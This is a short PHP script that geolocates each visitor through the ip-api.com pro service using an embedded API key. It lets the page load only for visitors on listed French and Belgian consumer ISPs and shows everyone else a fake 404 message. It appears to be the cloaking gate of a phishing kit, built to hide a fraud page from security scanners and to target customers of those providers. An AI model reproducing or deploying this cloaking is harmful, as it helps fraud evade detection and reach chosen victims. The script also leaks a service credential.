<?php
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '')
{
    $ipinfo = file_get_contents("https://pro.ip-api.com/json/" . $ip . "?key=s3DD9L9nYAxD9mz");
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
$visitor_ip = $_SERVER['REMOTE_ADDR'];
$ipinfo_json = getIpInfo($visitor_ip);
$org = "{$ipinfo_json['as']}";
$isps = "{$ipinfo_json['isp']}";
if (strpos($org, "wanadoo") || strpos($org, "bbox") || strpos($org, "Bouygues") || strpos($org, "Orange") || strpos($org, "sfr") || strpos($org, "SFR") || strpos($org, "Sfr") || strpos($org, "free") || strpos($org, "Free") || strpos($org, "FREE") || strpos($org, "red") || strpos($org, "proxad") || strpos($org, "club-internet") || strpos($org, "oleane") || strpos($org, "nordnet") || strpos($org, "liberty") || strpos($org, "colt") || strpos($org, "chello") || strpos($org, "belgacom") || strpos($org, "proximus") || strpos($org, "skynet") || strpos($org, "aol") || strpos($org, "neuf") || strpos($org, "darty") || strpos($org, "bouygue") || strpos($org, "numericable") || strpos($org, "Free") || strpos($org, "Num\303\251ris") || strpos($org, "Poste") || strpos($org, "Sosh"))
{
}
else
{
    die('HTTP/1.0 404 Not Found');
}

?>
